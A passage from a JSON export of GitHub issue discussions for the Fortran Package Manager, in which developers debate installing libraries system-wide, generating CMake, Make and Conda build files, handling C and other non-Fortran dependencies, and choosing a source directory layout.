                    "text": "I read through stack install --help but didn't see an option to install into /usr/local/bin/.\n\nFor the records, on Ubuntu 20.04, if I copy manually my library files (libsomething.a) in /usr/local/lib/ or /usr/lib, gfortran finds it with $ gfortran libtest.f90 -lsomething.\nHowever, copying the module files to /usr/local/include does not work and the full path must be specified after the -I flag: $ gfortran libtest.f90 -lsomething -I/usr/local/include\nPS: sorry for having repeatedly edited my message, but I have been experimenting a bit and I didn't want to leave confusing or contradictory messages around."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-04 02:16:33+00:00",
                    "text": "I think having an install functionality is definitely desired. I believe with stack, stack install is just for executables. I'd lean towards doing the same thing with FPM. I can easily see the desire to install an executable, but I'm not sure I fully understand the benefits of having FPM install libraries.\nFor installing libraries, I tend to lean on the side of not doing anything that goes around the system package manager, since there's a decent chance of breaking things. Also, FPM is compiling archives, not shared object libraries. And if you're using FPM, you don't need to have the library installed on your system in order for other packages to use it. That's whole point of FPM.\nI'm not completely opposed to the idea, but I would need somebody to show me a use case that would constitute good practice. I'd rather FPM not try and also take on the role of system package manager. I think twice about anything that needs sudo to do it."
                },
                {
                    "user": "certik",
                    "date": "2020-05-04 04:38:39+00:00",
                    "text": "Ah, I missed this point: this is about fpm installing the apps and libraries systemwide.\nWhy don't we start with what Cargo does via cargo install --root ... which however is for Cargo managed packages, and then we see what else we can do. I think installing apps that are statically linked should be no problem.\nFinally, that's a good point that if fpm is to become a usable replacement for CMake (let's say), it must be able to install the executables and libraries to a user defined location.\n(Most probably we'll have to be able to build both static and dynamic libraries with fpm down the road.)"
                },
                {
                    "user": "LKedward",
                    "date": "2020-05-04 07:47:24+00:00",
                    "text": "For installing libraries, I tend to lean on the side of not doing anything that goes around the system package manager, since there's a decent chance of breaking things.\n\nThe Linux file system has a well-defined segregation between files installed by package managers and those built by users; as @epagone mentioned user-built executables/libraries/headers go in /usr/local/bin /usr/local/lib (both shared and static) and /usr/local/include. This is a common target for makefiles for c libraries and avoids the need to specify include and library paths when compiling and linking.\nHowever this approach can't be used for Fortran libraries because:\n\n\nUnlike c, Fortran has no application binary interface which means that compiled libraries are specific to the compiler and compiler version that compiled it.\n\n\nThere is no agreed-upon location to place (and search for) the requisite .mod files, which are also binary-specific to the compiler and compiler version that generated them.\n\n\nI agree with @everythingfunctional that one of the goals of fpm is to solve this problem for us; specifically, it handles module paths and linker library paths for us in a robust and repeatable manner (which is the main advantage of installing system-wide IMO).\nI think install functionality for executables is a natural functionality, I would like:\n\n(sudo) fpm install for /usr/local/bin and;\nfpm install --local for $HOME/.local/bin"
                },
                {
                    "user": "epagone",
                    "date": "2020-05-04 10:10:17+00:00",
                    "text": "@everythingfunctional\n\nI think having an install functionality is definitely desired. I believe with stack, stack install is just for executables. I'd lean towards doing the same thing with FPM. I can easily see the desire to install an executable, but I'm not sure I fully understand the benefits of having FPM install libraries.\nFor installing libraries, I tend to lean on the side of not doing anything that goes around the system package manager, since there's a decent chance of breaking things. Also, FPM is compiling archives, not shared object libraries. And if you're using FPM, you don't need to have the library installed on your system in order for other packages to use it. That's whole point of FPM.\n\nSorry, but I do not understand. Let's take this example: I have a string manipulation library that I build from source pulling a GitHub repo. I need this library in almost all of my many projects. I think it's obvious to expect from the package manager the ability to make the library available system-wide. (FWIW, I am not using FoBiS exactly because it lacks this functionality.) Am I doing something wrong in my development procedures?\n@LKedward\n\nHowever this approach can't be used for Fortran libraries because:\n1. Unlike c, Fortran has no application binary interface which means that compiled libraries are specific to the compiler and compiler version that compiled it.\n\n2. There is no agreed-upon location to place (and search for) the requisite `.mod` files, which are also binary-specific to the compiler and compiler version that generated them.\n\n\nOuch. Thanks for this explanation, but it's really a bad news! \ud83d\ude1e"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-04 14:29:36+00:00",
                    "text": "I need this library in almost all of my many projects.\n\nIf you're using FPM, then it has the responsibility to provide the appropriate version to compile and link with your project. It does not rely on whatever version happens to be installed on your system.\nSay for example, the latest version of a library introduced a breaking change that your project relies on. You can continue using the old version for your old project, but use the latest version in your new project, on the same machine, and not have any issues."
                },
                {
                    "user": "certik",
                    "date": "2020-05-04 15:22:18+00:00",
                    "text": "@epagone wrote:\n\nI think it's obvious to expect from the package manager the ability to make the library available system-wide.\n\nYes, that's the goal. Fpm must have an option to install a library systemwide or to any location you want."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-04 15:35:54+00:00",
                    "text": "I also think it's important to allow both static and dynamic library builds down the road.\nIf I understand this correctly, it seems to me that the high-level debate here is whether fpm should work only within the context of a local, package-specific environment (@everythingfunctional position I think), vs. whether fpm could also install to places elsewhere on the system (regardless whether it's a root or user directory).\nIf you always worked in the package-specific environment, that means that you'd need to rebuild the same dependency for every project that uses it, rather than re-use an existing build. I don't know if Cargo for example can build system-wide, but its canonical behavior is to rebuild everything per-project. For example if you try a demo database or web-server project in Rust, you'll first be building all the 500 dependencies that it needs.\nBesides the rationale others already provided, another advantage to this is that some libraries take some time to build (for example NetCDF). Rebuilding them for every new project would hurt user experience.\nI think both approaches should be possible. Default should be like Cargo. How about this UI:\n\nFor in-package build, fpm build suffices, no need for fpm install. The library is already installed in build/... in the package directory.\nFor install elsewhere, fpm install installs to a sane default user location, perhaps /home/user/.fpm/{bin,lib,include}.\nFor install to a specific place, fpm install --prefix=/path/to/install."
                },
                {
                    "user": "certik",
                    "date": "2020-05-04 15:48:08+00:00",
                    "text": "I agree with @milancurcic's proposal at the end.\nLet's start with rebuilding everything for each directory where you call fpm build. But down the road fpm can simply build somewhere in ~/.fpm/ and cache each build and reuse them where possible.  Note also that this build directory (whether local to a project directory or in ~/.fpm/) I think might be a bit different from the fpm install command --- the build directory might have more information / metadata that the install command doesn't need to install.\nAnyway, I think we can design this so that each of us will get the functionality that we want."
                },
                {
                    "user": "LKedward",
                    "date": "2020-05-04 15:54:37+00:00",
                    "text": "If we do eventually place built libraries in a central location like ~/.fpm/ then I would suggest that this path include the compiler and compiler version for the same reasoning as #66 due to binary incompatibility between compilers. e.g. ~/.fpm/gfortran-9.1.0/bin etc."
                },
                {
                    "user": "certik",
                    "date": "2020-05-04 17:55:03+00:00",
                    "text": "@LKedward yes, that's necessary. In fact it should be done by hashes, where a hash depends on:\n\ncompiler vendor and version\nwhether Debug or Release build\nhash of the sources for the package\nall dependencies' hashes\nhow the given package was configured --- Cargo allows some optional capabilities and we might too in the future, say if you want to build a package with or without netcdf support\n..."
                }
            ]
        },
        {
            "number": 70,
            "user": "certik",
            "date": "2020-04-30 20:08:12+00:00",
            "title": "Have a Conda backend",
            "text": "This is related to #69 but it's a separate issue. fpm should be able to create a Conda package for the project, so that it's easy to submit it to conda-forge.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 21:27:15+00:00",
                    "text": "What's required for a Conda package?"
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 21:44:39+00:00",
                    "text": "Here is a Conda package for my dftatom Fortran package:\nhttps://github.com/conda-forge/dftatom-feedstock/\nThe main config file:\nhttps://github.com/conda-forge/dftatom-feedstock/blob/5f4e97e3c089337b5a8e4c9be6c2c7f36dca8c6c/recipe/meta.yaml\nLinux / macOS build script:\nhttps://github.com/conda-forge/dftatom-feedstock/blob/5f4e97e3c089337b5a8e4c9be6c2c7f36dca8c6c/recipe/build.sh\nAnd Windows build script:\nhttps://github.com/conda-forge/dftatom-feedstock/blob/5f4e97e3c089337b5a8e4c9be6c2c7f36dca8c6c/recipe/bld.bat\nAll of which could be generated. The build process could simply just call fpm on all platforms."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 22:50:54+00:00",
                    "text": "That seems like it wouldn't actually require any changes to FPM."
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 23:27:16+00:00",
                    "text": "One still has to generate things like \"description\", \"name\" (both of which fpm knows), and the proper template to call fpm. But yes, it should be a simple backend to fpm."
                }
            ]
        },
        {
            "number": 69,
            "user": "certik",
            "date": "2020-04-30 20:07:05+00:00",
            "title": "Have CMake and Make backends",
            "text": "Currently the Haskell based fpm is compiling things directly, just like Cargo does it. That's the best default. (The \"archived\" Rust based fpm was generating CMake.)\nHowever, until fpm is everywhere used by everybody, it would be super helpful to have a CMake and pure Make backends. That way we can move packages like stdlib or any of my own packages into using fpm, and yet not require it from the users --- they would continue using CMake or Make.\nAlso by generating the CMake / Make automatically, it will be a lot easier to maintain those in stdlib for example.\nSince fpm knows (or should know) everything about the Fortran project, it can generate 100% robust CMake and Make files, following the latest practices for CMake / Make, human readable, etc.\nI am thinking having these backends would be beneficial for many purposes, such as debugging, anyway. We should also have a Ninja backend.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-04-30 20:18:49+00:00",
                    "text": "and yet not require it from the users --- they would continue using CMake or Make.\nAlso by generating the CMake / Make automatically, it will be a lot easier to maintain those in stdlib for example.\n\nI don't understand why generate CMake of Make files. If fpm is smart enough to generate a correct CMake or Makefile for an arbitrary package, would it not be smart enough to simply build the package on its own?\nI thought that the value of enabling CMake or Make backend is when fpm is not smart enough yet to build the package on its own, but is just smart enough to detect an existing CMakeLists.txt, Makefile, or configure file, and run the appropriate commands to build it, like, cmake . or FC=gfortran make."
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 20:31:08+00:00",
                    "text": "Let me see if I can explain it better.\nWe should assume that fpm is smart enough to completely build the project on its own. We are very close and we will get there soon.\nThe other assumption is that the goal has never been to call an existing CMakeLists.txt or configure script. The whole point of fpm is that users write fpm.toml and they never write CMakeLists.txt or configure by hand.\nSo with these assumptions, yes, you can just use fpm. However, it will be a while before we can just get every user using fpm. For example I don't think it would be wise to get rid of the CMake build system in stdlib and only use fpm --- maybe later, but not today. At the same time, I would love to be using fpm with stdlib as well as all my other Fortran projects now.  So to achieve it, if fpm can generate CMake, then users of my packages can keep using CMake as they do now. But I, as a developer, can just use fpm, and use fpm to generate the CMake files for my users (and commit them to git), so that I do not need to maintain the fpm build system, and a separate CMake build system by hand. And since fpm knows how to build the project on its own, it also by definition knows how to generate beautiful looking CMake files that just work (or any other build system also)."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-30 20:48:36+00:00",
                    "text": "Okay, I understand now. The use case for this is when a developer releases a new package, they can use fpm to emit configuration files for different build systems.\nFor example, datetime-fortran started with a manual Makefile. Then Zaak wrote a CMakeLists.txt, and Michael modernized it later. Mark wrote an autotools config. Now it can be built in these different ways.\nIf I had fpm back then, I could just have done something like:\nfpm build --cmake\nfpm build --make\nfpm build --conda\n...\n\nand be done with it."
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 20:55:48+00:00",
                    "text": "Yes exactly. And not just be done with it, but you can keep using fpm to keep the other build systems up-to-date. When you have a bigger project, the inter-dependencies of Fortran modules change every time you modify the use line (all the time). So you have to update manual Makefiles all the time you change this. And every time you add / remove files or move them around, you would have to update CMake also. fpm could do all that for you.\nIn fact fpm could detect that your project contains fpm-generated CMake (from some comment in it) and it can warn you every time it needs to be re-generated."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 21:25:36+00:00",
                    "text": "So, the idea here is that, not only should FPM be able to use \"non\"-FPM packages, it should also be able to generate \"non\"-FPM packages? I think this may be inviting a lot of requests for special cases. We might end up constantly chasing users who aren't willing to actually use FPM as intended.\nI'm not saying it isn't doable or worth considering. If we limit the scope to saying these other build systems must functionally produce exactly what FPM itself would do it might not be too bad, but then I don't think that actually reaches many people that we wouldn't have already convinced to switch over.\nOn the other hand it might provide a slightly smoother transition path. Make these tweaks to your current build system so FPM can use. Then get all your user's to adjust to that. Then stop maintaining that build system yourself and let FPM do it.\nI'll have to think about this for a while."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-30 21:37:02+00:00",
                    "text": "I made a joke a year ago, and we may actually do it.\nI share the same concerns as Brad. Mainly that this effort may not be closely aligned with FPM itself. In other words, it would be helping users to not use FPM. On the other side, if this would help many packages support multiple build systems, it would improve their portability, a long-term Fortran goal."
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 21:51:19+00:00",
                    "text": "From a practical perspective, we already use both CMake and manual Makefiles for stdlib (because people have requested both) and now we also want to use fpm. I have the same problem with dftatom and Milan with datetime-fortran. I bet there are tons of other projects like that too. So instead of each of us maintaining 3 different build systems, let's just all collaborate on CMake and Makefile backend to fpm, which will produce higher quality CMake / Makefile in the end, and it will remove the burden of each of us maintaining 3 different build systems."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 22:53:34+00:00",
                    "text": "Ok, let's at least finish a beta version that just supports standard FPM projects before we start tackling this one though."
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 23:27:47+00:00",
                    "text": "I agree. I only posted it here to keep it in mind."
                },
                {
                    "user": "lauvergn",
                    "date": "2020-07-07 18:00:39+00:00",
                    "text": "Okay, I understand now. The use case for this is when a developer releases a new package, they can use fpm to emit configuration files for different build systems.\nFor example, datetime-fortran started with a manual Makefile. Then Zaak wrote a CMakeLists.txt, and Michael modernized it later. Mark wrote an autotools config. Now it can be built in these different ways.\nIf I had fpm back then, I could just have done something like:\nfpm build --cmake\nfpm build --make\nfpm build --conda\n...\n\nand be done with it.\n\nI think this feature will be great in particular when you want to distribute a code:\n\nsome users just want to type \"make\" to be able to compile the code (and maybe edit the makefile)\nthe fpm installation (with its dependencies) is not straightforward and it adds another layer. If it fails, without this feature you will not be able to run the code.\n\nlauvergn (alias gardhor)"
                }
            ]
        },
        {
            "number": 68,
            "user": "certik",
            "date": "2020-04-30 19:50:53+00:00",
            "title": "How to handle non-Fortran dependencies",
            "text": "I am very confident we can make fpm very robust to work for pure Fortran packages. Just like Cargo works well for pure Rust packages or pip works great for pure Python packages.\nThe problem is with non-Fortran packages. Pip allows to hook in compiling C (and with some work) Fortran code, but it's very fragile in my experience (thus the motivation for Conda that is a binary package manager). Python doesn't have an option to avoid C++/Fortran dependencies because Python itself is slow. Rust allows to (in principle) rewrite everything in Rust. As an example, take png. The system bindings: https://crates.io/crates/libpng-sys they say are unreliable, and you should use a pure Rust implementation: https://lib.rs/crates/lodepng.\nI agree it does make things more robust to stick to pure Fortran and for many things we will do that and people will provide pure Fortran implementation of basic tasks. Python cannot do it well due to performance, but Rust and Fortran can.\nHowever, we still need a robust way of handling non-Fortran dependencies, because if there is a robust and well maintained library in another language, we should just use it instead of reimplementing everything. Take HDF5. Here is the Rust package: https://crates.io/crates/hdf5. If you look at the documentation how to build it: https://github.com/aldanor/hdf5-rust they even mention Conda (to install the HDF5 library itself on all platforms --- which in my experience is much more robust than pip). Anyway, the way it works is by this line: https://github.com/aldanor/hdf5-rust/blob/15ec644977e0bee2b77340272730b34209c3765b/Cargo.toml#L11 which causes Cargo to execute this script: https://github.com/aldanor/hdf5-rust/blob/15ec644977e0bee2b77340272730b34209c3765b/build.rs which emits flags how to link against HDF5 correctly. That way the Cargo itself doesn't need to know almost anything, it just parses the output of this file. I think we should follow the same approach in fpm. The flags in this case are emitted by: https://github.com/aldanor/hdf5-rust/blob/d4c3737772bec477739c75566a3d52d0a44f27ba/hdf5-sys/src/lib.rs#L65. I think this is when you link against hdf5 rust package in your own code. How to link against hdf5 library itself is done here I think: https://github.com/aldanor/hdf5-rust/blob/d4c3737772bec477739c75566a3d52d0a44f27ba/hdf5-sys/build.rs#L566, it's quite complicated unfortunately.\nBut it's clean from the Cargo side, it offloads the responsibility to the package itself. We can provide helpers that fpm packages can use to work with things like pkg-config, cmake packages, etc.\nIn Rust it looks like each package is on their own, so for example this HDF5 package has messy code for each platform, e.g., here: https://github.com/aldanor/hdf5-rust/blob/d4c3737772bec477739c75566a3d52d0a44f27ba/hdf5-sys/build.rs#L492, you can see they are checking brew, or Windows registry, etc.\nThe good news is that Fortran codes do not need many non-Fortran dependencies, and so doing what Rust does might work for us. What I've seen is that Fortran codes mostly need some of: Lapack, MPI, FFT, MKL, HDF5, JSON, NETCDF, HYPRE, ...\nOf which MPI and Lapack being the most important. I think fpm will have support for all Fortran compilers and I think it can have built-in support for MPI and Lapack also. One reason to special case MPI and Lapack is so that one can switch MPI implementaitons and Lapack implementations easily, and not have the Fortran packages hardcoded with a particular implementation.\nWith those out of the way, the rest can be done Cargo style, at least for now. Most other packages have just one implementation, so Fortran packages can just depend on a particular package (say Arpack, or Scalapack).",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-04-30 20:03:57+00:00",
                    "text": "I agree, this sounds quite reasonable as a first stab. Thank you for the research.\nMy personal sorted list of most used non-Fortran dependencies: MPI, HDF5, NetCDF, zlib, libpng.\nIf everybody here listed their most used dependencies, we could have an idea of top candidates which to design for and test first."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 21:06:38+00:00",
                    "text": "I definitely would like to be able to handle some non-Fortran dependencies. As it's currently designed, I think it won't be that difficult.\nThe end result of building a library in FPM is just a .a file, and all of the relevant .mod files. So, if your package specifies a build script for that, FPM will just call it. There is a small set of things that FPM would like to dictate to that script though. Those being:\n\nThe compiler to use\nThe compiler flags to use (mostly to ensure the flags are compatible with the given compiler)\nWhere to put the archive and module files\nWhere to find any of the dependencies\n\nIn this way, almost anything could be wrapped into an FPM package. Best practice would be to entirely wrap the package into a Fortran API, so consumers don't necessarily even have to know it's not Fortran, but this may not be strictly necessary in every case.\nFor the build scripts, I really like Rust's way of having the build scripts be written in Rust too. Not sure if Fortran would really be doable for that, but it would make sure building a package doesn't have additional external requirements. We could special case Makefiles and CMakeLists to use the typical environment variables I think."
                },
                {
                    "user": "pdebuyl",
                    "date": "2020-05-13 12:53:00+00:00",
                    "text": "C has a special relationship to Fortran though. Thanks to the compatibility section, it makes sense for a Fortran developer to include C code in a Fortan project. Could that be taken into account?\nMy \"pet\" usage for this is to write a PRNG in C with a Fortran wrapper module. PRNGs often use unsigned integers whose usage is possible in C.\nA fpm package could thus, in this scenario, contain Fortran and C source."
                },
                {
                    "user": "certik",
                    "date": "2020-05-13 14:18:22+00:00",
                    "text": "@everythingfunctional, @milancurcic and I discussed this point on the phone and we think so far that the best way forward is to work with Conda (or Mamba to be specific) together with their developers (@wolfv and others) to provide all non-Fortran dependencies. fpm would link with mamba and from a user perspective things would just work (users would not need to handle Conda environments explicitly).\nRegarding C support, I would suggest initially to handle them via Conda, just to keep things simple.\nWe can think if if want to later extend fpm to handle not only Fortran compilers but also C and C++ compilers."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-13 14:34:13+00:00",
                    "text": "@pdebuyl , my recommendation would be to put the C parts of your project in a separate project so that fpm can easily build the \"pure Fortran\" part of your project with ease.\nWe're planning to support make and Cmake as separate build scripts, so supporting linking with (almost) any other language and still having it be an fpm package would be possible."
                },
                {
                    "user": "LKedward",
                    "date": "2020-05-13 16:20:01+00:00",
                    "text": "@everythingfunctional , @certik , what are the disadvantages/difficulties with natively supporting c sources in fpm? Many projects do need to include c code from time to time and this is quite normal for Fortran (even before iso_c_binding came along). I think this would be a good feature.\n(I'm not talking about whole package dependencies, just self-contained projects with mixed c/Fortran code)."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-13 16:26:15+00:00",
                    "text": "I don't foresee issues with building C alongside Fortran. It may be even simpler as there are no modules to deal with."
                },
                {
                    "user": "certik",
                    "date": "2020-05-13 16:35:13+00:00",
                    "text": "Regarding C support: a full solution there is this: mamba-org/mamba#223.\nWhat we could do for fpm is not the full solution, but provide functionality for simple C source files, not full packages with a complicated build system.\nWe have to decide on a layout for C sources:\n\n\nShould the .c files be simply files in src/ folder? (I vote yes.)\n\n\nWhere should the header files be? Either in src/ or in include/.\n\n\nWhat about dependencies and their header files? (I would suggest Conda and that you can use anything from there, so fpm will create an internal environment and you can use any header file from there.)\n\n\nWhat about linking of dependencies?\n\n\nGiven that we will support C, why not C++ also? Supporting C++ would be very useful to provide Fortran wrappers: we would write a simple C wrapper that calls into a 3rd party C++ library, and call that C wrapper from Fortran, so it requires compiling of a C++ code.\n\n\nAlso one needs to link libc properly for C, and libc++ properly for C++. I think we have to do this anyway anytime we depend on a C or C++ library.\n\n\nThere will be more issues. Some of them similar to what we have to deal with anyway for Fortran sources. So I think let's keep this option open when we are designing fpm, although I still suggest to concentrate on Fortran sources first."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-13 17:24:18+00:00",
                    "text": "The low hanging fruit here seems to be handling the mixed C and Fortran source in a single project.\nJust let .c and .h sit in src/ by default, use gcc by default (like we do now with gfortran), link all object files into a static library and executable (like we do now).\nLinking to external (binary) dependencies seems orthogonal to this. Nevertheless important, but we could tackle these incrementally."
                },
                {
                    "user": "pdebuyl",
                    "date": "2020-05-13 20:47:04+00:00",
                    "text": "I had in mind the \"simple\" use case of one or a few c files that indeed \"just get compiled\" as part of the Fortran module. Making the shared C libraries available to other Fortran \"consumer code\" is probably out of scope. Anyway, thank you for the replies :-)"
                },
                {
                    "user": "certik",
                    "date": "2020-05-13 21:40:36+00:00",
                    "text": "@pdebuyl thanks for bringing it up, I think we can do that. Looking at my own code here: https://github.com/certik/hfsolver/tree/master/src, I have .f90 files, .c and .h files and also .cpp files all in the src directory. So if fpm could eventually compile all that correctly, that would go a long way. The reason I have the C and C++ files are just to interface 3rd party libraries, typically there is no way around that, as one must write some simpler wrapper that is ready to be called from Fortran using the iso_c_binding interface.\nSo I like this."
                }
            ]
        },
        {
            "number": 67,
            "user": "everythingfunctional",
            "date": "2020-04-30 03:21:47+00:00",
            "title": "Add sections to PACKAGING.md on explicit fpm.toml and tests",
            "text": "Add a couple of sections to the PACKAGING.md file and some other minor fixes.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-04-30 15:41:51+00:00",
                    "text": "I played with fpm finally, and it works well. This is how I was imagining it would work. Obviously it is still a prototype, but a usable one. Thank you @everythingfunctional for putting all the effort there! I really appreciate it.\nI think we need a mailinglist, for a general discussion. @milancurcic how about we create a fortran-lang mailinglist and simply see how it goes? We can always close it if it does not work out."
                }
            ]
        },
        {
            "number": 66,
            "user": "LKedward",
            "date": "2020-04-29 15:12:24+00:00",
            "title": "Support multiple compilers side-by-side in build",
            "text": "Currently compiled binaries are placed in build/debug/ and build/release.\nWould it be possible to make this build path dependent on compiler (and maybe architecture)?\ne.g. build/gfortran-9.2.0-x86_64_debug/\nThis reason for this being that I like to build and test my projects on multiple compilers during development; separating the binary output paths allows incremental builds using multiple compilers and allows tests on each compiler to run simultaneously and without clean and rebuild.\nThis may be considered an 'ugly' directory structure, however since fpm handles all compiler/linker paths and offers the fpm run command, this has no effect on end-user experience.\nThe workflow for using a non-default compiler could then be along the lines of:\n$> export FC=ifort\n$> fpm run\n\nor\n$> FC=ifort fpm run\n\nor\n$> fpm run --compiler=ifort",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-29 15:51:56+00:00",
                    "text": "Yeah, this shouldn't be too difficult. Good idea."
                }
            ]
        },
        {
            "number": 65,
            "user": "milancurcic",
            "date": "2020-04-29 14:45:54+00:00",
            "title": "How to build multiple programs?",
            "text": "Currently, FPM can build only one executable program, namely main.f90.\nHere's how Cargo does it:\n.\n\u251c\u2500\u2500 Cargo.lock\n\u251c\u2500\u2500 Cargo.toml\n\u251c\u2500\u2500 src/\n\u2502   \u251c\u2500\u2500 lib.rs\n\u2502   \u251c\u2500\u2500 main.rs\n\u2502   \u2514\u2500\u2500 bin/\n\u2502       \u251c\u2500\u2500 named-executable.rs\n\u2502       \u251c\u2500\u2500 another-executable.rs\n\u2502       \u2514\u2500\u2500 multi-file-executable/\n\u2502           \u251c\u2500\u2500 main.rs\n\u2502           \u2514\u2500\u2500 some_module.rs\n\u251c\u2500\u2500 benches/\n\u2502   \u251c\u2500\u2500 large-input.rs\n\u2502   \u2514\u2500\u2500 multi-file-bench/\n\u2502       \u251c\u2500\u2500 main.rs\n\u2502       \u2514\u2500\u2500 bench_module.rs\n\u251c\u2500\u2500 examples/\n\u2502   \u251c\u2500\u2500 simple.rs\n\u2502   \u2514\u2500\u2500 multi-file-example/\n\u2502       \u251c\u2500\u2500 main.rs\n\u2502       \u2514\u2500\u2500 ex_module.rs\n\u2514\u2500\u2500 tests/\n    \u251c\u2500\u2500 some-integration-tests.rs\n    \u2514\u2500\u2500 multi-file-test/\n        \u251c\u2500\u2500 main.rs\n        \u2514\u2500\u2500 test_module.rs\n\nSo, for Fortran, the main executable could be src/main.f90, and other executables could go in src/bin.\nI like this approach, and I am not married to this particular directory structure. I also like the structure that we have now, namely app/, src/, tests/.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-29 15:57:27+00:00",
                    "text": "Right now, if you want multiple executables you have to specify them manually. I'm open to enabling some auto-detection of multiple executables. I'll put together an outline of what that would look like."
                },
                {
                    "user": "certik",
                    "date": "2020-04-29 16:28:46+00:00",
                    "text": "I like the Cargo layout a lot. Brad, is there a reason to use app? I would switch to src/bin to be consistent with Cargo.\n\u2026\nOn Wed, Apr 29, 2020, at 8:46 AM, Milan Curcic wrote:\n\n\n Currently, FPM can build only one executable program, namely `main.f90`.\n\n Here's how Cargo\n <https://doc.rust-lang.org/cargo/guide/project-layout.html> does it:\n\n `.\n \u251c\u2500\u2500 Cargo.lock\n \u251c\u2500\u2500 Cargo.toml\n \u251c\u2500\u2500 src/\n \u2502   \u251c\u2500\u2500 lib.rs\n \u2502   \u251c\u2500\u2500 main.rs\n \u2502   \u2514\u2500\u2500 bin/\n \u2502       \u251c\u2500\u2500 named-executable.rs\n \u2502       \u251c\u2500\u2500 another-executable.rs\n \u2502       \u2514\u2500\u2500 multi-file-executable/\n \u2502           \u251c\u2500\u2500 main.rs\n \u2502           \u2514\u2500\u2500 some_module.rs\n \u251c\u2500\u2500 benches/\n \u2502   \u251c\u2500\u2500 large-input.rs\n \u2502   \u2514\u2500\u2500 multi-file-bench/\n \u2502       \u251c\u2500\u2500 main.rs\n \u2502       \u2514\u2500\u2500 bench_module.rs\n \u251c\u2500\u2500 examples/\n \u2502   \u251c\u2500\u2500 simple.rs\n \u2502   \u2514\u2500\u2500 multi-file-example/\n \u2502       \u251c\u2500\u2500 main.rs\n \u2502       \u2514\u2500\u2500 ex_module.rs\n \u2514\u2500\u2500 tests/\n     \u251c\u2500\u2500 some-integration-tests.rs\n     \u2514\u2500\u2500 multi-file-test/\n         \u251c\u2500\u2500 main.rs\n         \u2514\u2500\u2500 test_module.rs\n `\n So, for Fortran, the main executable could be `src/main.f90`, and other\n executables could go in `src/bin`.\n\n I like this approach, and I am not married to this particular directory\n structure. I also like the structure that we have now, namely `app/`,\n `src/`, `tests/`.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#65>, or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWEWB2SGOZD73V6TTXTRPA4TFANCNFSM4MTZD3CQ>."
                },
                {
                    "user": "LKedward",
                    "date": "2020-04-29 16:34:11+00:00",
                    "text": "I actually much prefer app to src/bin. In my mind a bin directory is for binary files only, not source code."
                },
                {
                    "user": "certik",
                    "date": "2020-04-29 16:54:16+00:00",
                    "text": "Ok. Well, let's at least evaluate the options how to structure the layout with pros / cons. Because once we pick one, it will be hard to change.\n\u2026\nOn Wed, Apr 29, 2020, at 10:34 AM, LKedward wrote:\n\n\n I actually much prefer `app` to `src/bin`. In my mind a `bin` directory\n is for binary files only, not source code.\n\n \u2014\n You are receiving this because you commented.\n Reply to this email directly, view it on GitHub\n <#65 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWCPT6UMT3RKJ6WRDJ3RPBJJFANCNFSM4MTZD3CQ>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-29 17:28:53+00:00",
                    "text": "The app, src separation makes it much easier to determine what should be packaged up into the library, and what is just for use in executable(s). I also makes finding the executable(s) a bit simpler for the automatically detected case. If we switch to the src/bin approach I'll need to special case out of searching that directory when building the library."
                },
                {
                    "user": "certik",
                    "date": "2020-04-29 17:59:54+00:00",
                    "text": "I see, good point. Are we still doing src/main.f90 to mean an executable? If so, then you have to special case this anyway."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-29 18:13:31+00:00",
                    "text": "I think we should aim to minimize special cases in the UI, and implement accordingly. A good test for this is asking what design leads to the simplest user guide.\nFor example, if everything in src is considered a library component except src/main.f90 and src/bin/*.f90, then these are special cases that require additional clauses in the documentation.\nOn the other hand, app for programs and src for library is simplest to explain to a user, and is currently my favorite solution.\nAn even simpler UI than this (to explain to a user) is to have program files be programs, and module files be modules, regardless of where they are in the tree. However this complicates implementation because now fpm needs to parse the sources. A downside is that now there may not be clear separation between programs and module files if the user is just looking at the source tree. However if you have app and src, it's clear.\nWe should study Rust+Cargo model in detail, but we shouldn't assume that it's the optimal solution for us. This could be because of Rust's own history of the project, or because Rust and Fortran are different languages and have different cultures.\nI agree with @LKedward about app vs bin."
                },
                {
                    "user": "certik",
                    "date": "2020-04-29 18:27:07+00:00",
                    "text": "Good points. Note that fpm has to parse the sources anyway to determine module dependencies and to enforce that each module name is named appropriately.\nSo looks like the most natural solution so far is:\n\nsrc contains module files (or loose procedures / function --- we should not encourage it, but some existing projects do that and I think we can incorporate this without harm). Everything in src gets built into a library.\napp, contains programs. Perhaps app/main.f90 could be the main program (by default executed by fpm run).\ntests contains tests\nbench contains benchmarks (we can do this one later perhaps --- although most of my projects contain some kind of benchmarks which are distinct from apps and distinct from tests)"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-29 21:41:54+00:00",
                    "text": "I see, good point. Are we still doing src/main.f90 to mean an executable? If so, then you have to special case this anyway.\n\nNo, I didn't implement src/main.f90 to be an executable. If it sees that it will expect it to be a module named main."
                }
            ]
        },
        {
            "number": 64,
            "user": "milancurcic",
